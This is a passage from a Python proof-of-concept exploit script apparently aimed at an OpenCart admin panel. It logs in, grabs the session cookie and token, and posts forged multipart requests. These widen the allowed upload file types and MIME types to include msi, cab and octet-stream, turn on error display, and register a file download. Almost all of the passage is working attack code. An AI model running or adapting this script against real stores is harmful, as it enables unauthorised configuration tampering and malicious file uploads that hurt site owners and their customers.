mjqPAUSWNBtBEGJ68tt50RUbGI\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_file_max_size\"\r\n\r\n300000\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_file_ext_allowed\"\r\n\r\nzip\r\ntxt\r\npng\r\njpe\r\njpeg\r\njpg\r\ngif\r\nbmp\r\nico\r\ntiff\r\ntif\r\nsvg\r\nsvgz\r\nzip\r\nrar\r\nmsi\r\ncab\r\nmp3\r\nqt\r\nmov\r\npdf\r\npsd\r\nai\r\neps\r\nps\r\ndoc\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_file_mime_allowed\"\r\n\r\ntext/plain\r\nimage/png\r\nimage/jpeg\r\nimage/gif\r\nimage/bmp\r\nimage/tiff\r\nimage/svg+xml\r\napplication/zip\r\n\"application/zip\"\r\napplication/x-zip\r\n\"application/x-zip\"\r\napplication/x-zip-compressed\r\n\"application/x-zip-compressed\"\r\napplication/rar\r\n\"application/rar\"\r\napplication/x-rar\r\n\"application/x-rar\"\r\napplication/x-rar-compressed\r\n\"application/x-rar-compressed\"\r\napplication/octet-stream\r\n\"application/octet-stream\"\r\naudio/mpeg\r\nvideo/quicktime\r\napplication/pdf\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_error_display\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_error_log\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_error_filename\"\r\n\r\nerror.log\r\n-----------------------------7e417d361064c--\r\n"
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
    set2=r.status_code
    return set2



if __name__ == "__main__":
    n=loginad()
    adcookies=n['cookies']
    adtoken=n['token']
    #print(adcookies)
    #print(adtoken)
    
    burp0_url = "http://"+host+":80//admin/index.php?route=catalog/download/add&user_token="+adtoken
    burp0_cookies = {"OCSESSID": adcookies, "language": "en-gb", "currency": "USD"}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
    addfile()
    n1=setfile()
    n2=setdownload()
    print("poc run ")
    
    # if (n1==200 and n2==200):
    #     print("PoC success!")
    # else:
    #     print("PoC failed!")